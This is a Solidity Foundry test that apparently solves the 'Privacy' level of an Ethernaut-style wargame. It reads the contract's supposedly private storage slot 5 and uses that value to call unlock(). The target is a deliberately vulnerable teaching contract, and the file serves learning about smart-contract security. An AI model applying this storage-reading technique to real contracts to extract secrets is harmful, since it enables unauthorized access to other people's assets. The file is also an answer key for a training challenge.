// SPDX-License-Identifier: MIT
pragma solidity >=0.6.0;
pragma experimental ABIEncoderV2;

import "./utils/BaseTest.sol";
import "src/levels/Privacy.sol";
import "src/levels/PrivacyFactory.sol";

contract TestPrivacy is BaseTest {
    Privacy private level;

    constructor() public {
        levelFactory = new PrivacyFactory();
    }

    function setUp() public override {
        super.setUp();
    }

    function testRunLevel() public {
        runLevel();
    }

    function setupLevel() internal override {
        levelAddress = payable(this.createLevelInstance(true));
        level = Privacy(levelAddress);
        assertEq(level.locked(), true);
    }

    function exploitLevel() internal override {
        vm.startPrank(player, player);
        bytes32 data = vm.load(address(level), bytes32(uint256(5)));
        level.unlock(bytes16(data));

        assertEq(level.locked(), false);
        vm.stopPrank();
    }
}
